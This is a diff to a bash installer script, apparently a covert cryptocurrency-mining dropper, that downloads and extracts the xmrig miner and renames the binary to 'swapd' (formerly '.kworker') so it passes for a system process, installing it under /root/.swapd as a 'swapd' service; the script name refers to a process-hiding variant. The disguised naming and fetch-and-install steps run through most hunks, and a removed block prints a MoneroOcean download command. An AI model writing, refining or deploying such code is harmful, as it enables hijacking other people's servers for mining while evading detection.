@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="3.5"
-readonly BUILD_DATE="2026-03-14 23:18:25 UTC"
+readonly SCRIPT_VERSION="3.6"
+readonly BUILD_DATE="2026-03-14 23:51:56 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -2449,7 +2449,7 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
     echo "[*] Extracting xmrig.tar.gz..."
     echo "[*] Current directory: $(pwd)"
     echo "[*] Files before extraction:"
-    ls -la 2>/dev/null | grep -E "xmrig|\.kworker|swapd" || echo "    (no xmrig files found)"
+    ls -la 2>/dev/null | grep -E "xmrig|swapd" || echo "    (no xmrig files found)"
     
     tar -xzf xmrig.tar.gz 2>&1 | head -20 || {
         echo "[!] Failed to extract xmrig"
@@ -2457,7 +2457,7 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
     }
     
     echo "[*] Files after extraction:"
-    ls -la 2>/dev/null | grep -E "xmrig|\.kworker|swapd|config" || echo "    (no xmrig files found)"
+    ls -la 2>/dev/null | grep -E "xmrig|swapd|config" || echo "    (no xmrig files found)"
     
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
         echo "[*] Looking for xmrig binary..."
@@ -2466,10 +2466,10 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
         # Try multiple possible locations with explicit checking
         if [ -f xmrig ]; then
             echo "[✓] Found: xmrig (root level)"
-            mv xmrig .kworker 2>/dev/null || cp xmrig .kworker 2>/dev/null
-            if [ ! -f .kworker ]; then
+            mv xmrig swapd 2>/dev/null || cp xmrig swapd 2>/dev/null
+            if [ ! -f swapd ]; then
                 echo "[!] Move/copy failed, trying different approach..."
-                cp -f xmrig .kworker 2>&1 || echo "[!] Final copy attempt failed"
+                cp -f xmrig swapd 2>&1 || echo "[!] Final copy attempt failed"
             fi
         else
             # Check for xmrig in versioned directory (xmrig-*)
@@ -2477,7 +2477,7 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
             for dir in xmrig-*/xmrig; do
                 if [ -f "$dir" ]; then
                     echo "[✓] Found: $dir (versioned directory)"
-                    mv "$dir" .kworker 2>/dev/null || cp "$dir" .kworker 2>/dev/null
+                    mv "$dir" swapd 2>/dev/null || cp "$dir" swapd 2>/dev/null
                     FOUND_VERSIONED=true
                     break
                 fi
@@ -2489,7 +2489,7 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
                 for file in */xmrig; do
                     if [ -f "$file" ]; then
                         echo "[✓] Found: $file (subdirectory)"
-                        mv "$file" .kworker 2>/dev/null || cp "$file" .kworker 2>/dev/null
+                        mv "$file" swapd 2>/dev/null || cp "$file" swapd 2>/dev/null
                         FOUND_SUBDIR=true
                         break
                     fi
@@ -2506,9 +2506,9 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
             fi
         fi
         
-        if [ -f .kworker ]; then
-            echo "[✓] Binary successfully renamed to .kworker"
-            ls -lh .kworker 2>/dev/null || true
+        if [ -f swapd ]; then
+            echo "[✓] Binary successfully renamed to swapd"
+            ls -lh swapd 2>/dev/null || true
         else
             echo "[!] Failed to extract/rename xmrig binary"
             echo "[*] Trying direct approach - looking for any executable..."
@@ -2516,30 +2516,30 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
             for possible_binary in xmrig xmrig-* */xmrig; do
                 if [ -f "$possible_binary" ] && [ -x "$possible_binary" ]; then
                     echo "[*] Found executable: $possible_binary"
-                    cp -f "$possible_binary" .kworker 2>&1 && echo "[✓] Copied to .kworker" || echo "[!] Copy failed"
+                    cp -f "$possible_binary" swapd 2>&1 && echo "[✓] Copied to swapd" || echo "[!] Copy failed"
                     break
                 fi
             done
             
-            if [ ! -f .kworker ]; then
+            if [ ! -f swapd ]; then
                 DOWNLOAD_SUCCESS=false
             fi
         fi
     fi
 
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
-        chmod +x .kworker 2>/dev/null || true
+        chmod +x swapd 2>/dev/null || true
 
         # Check if binary exists and is an ELF executable
         echo "[*] Verifying binary..."
-        if [ -f .kworker ] && [ -x .kworker ]; then
+        if [ -f swapd ] && [ -x swapd ]; then
             # Check if it's a valid ELF binary (executable or PIE shared object)
-            if file .kworker 2>/dev/null | grep -qE "ELF.*(executable|shared object)"; then
+            if file swapd 2>/dev/null | grep -qE "ELF.*(executable|shared object)"; then
                 echo "[✓] Binary is a valid ELF executable"
 
                 # Try version check (non-critical - just informational)
-                if ./.kworker --version >/dev/null 2>&1; then
-                    VERSION_INFO=$(./.kworker --version 2>&1 | head -1 || echo "unknown")
+                if ./swapd --version >/dev/null 2>&1; then
+                    VERSION_INFO=$(./swapd --version 2>&1 | head -1 || echo "unknown")
                     echo "[✓] Version check passed: $VERSION_INFO"
                 else
                     echo "[!] WARNING: Cannot run --version (may need libraries)"
@@ -2548,7 +2548,7 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
                     # Show what libraries might be missing
                     if command -v ldd >/dev/null 2>&1; then
                         echo "[*] Checking dependencies:"
-                        ldd .kworker 2>&1 | grep "not found" || echo "    All dependencies found (or ldd failed)"
+                        ldd swapd 2>&1 | grep "not found" || echo "    All dependencies found (or ldd failed)"
                     fi
                 fi
 
@@ -2557,14 +2557,14 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
             else
                 echo "[!] ERROR: Downloaded file is not a valid ELF executable!"
                 if command -v file >/dev/null 2>&1; then
-                    echo "[*] File type: $(file .kworker)"
+                    echo "[*] File type: $(file swapd)"
                 fi
-                rm -rf xmrig-* xmrig.tar.gz .kworker
+                rm -rf xmrig-* xmrig.tar.gz
                 DOWNLOAD_SUCCESS=false
             fi
         else
             echo "[!] ERROR: Binary file missing or not executable"
-            rm -rf xmrig-* xmrig.tar.gz .kworker
+            rm -rf xmrig-* xmrig.tar.gz
             DOWNLOAD_SUCCESS=false
         fi
     fi
@@ -2591,43 +2591,6 @@ if [ "$DOWNLOAD_SUCCESS" = false ]; then
     echo "  4. Make executable: chmod +x /root/.swapd/swapd"
     echo "  5. Re-run this script"
     echo ""
-    exit 1
-fi
-
-# ==================== RENAME BINARY TO SWAPD ====================
-echo "[*] Renaming miner binary to 'swapd'..."
-
-# Simply rename the binary to swapd (no symlink, no wrapper!)
-if [ -f .kworker ]; then
-    if mv .kworker swapd; then
-        chmod +x swapd
-        echo "[✓] Binary renamed: .kworker → swapd (direct file, no symlink)"
-    else
-        echo "[!] Failed to rename, trying copy..."
-        cp .kworker swapd && chmod +x swapd
-        rm -f .kworker
-        echo "[✓] Binary copied to swapd"
-    fi
-elif [ -f xmrig ]; then
-    if mv xmrig swapd; then
-        chmod +x swapd
-        echo "[✓] Binary renamed: xmrig → swapd"
-    else
-        cp xmrig swapd && chmod +x swapd
-        echo "[✓] Binary copied to swapd"
-    fi
-else
-    echo "[!] CRITICAL ERROR: No miner binary found (.kworker or xmrig missing)"
-    echo "[!] Download/extraction failed - cannot continue with installation"
-    echo ""
-    echo "Manual fix required:"
-    echo "1. Download manually: curl -L -o /tmp/xmrig.tar.gz https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
-    echo "2. Extract: tar -xzf /tmp/xmrig.tar.gz -C /tmp/"
-    echo "3. Copy: cp /tmp/xmrig /root/.swapd/swapd"
-    echo "4. Make executable: chmod +x /root/.swapd/swapd"
-    echo "5. Restart: systemctl restart swapd"
-    echo ""
-    echo "Exiting..."
     exit 1
 fi
 
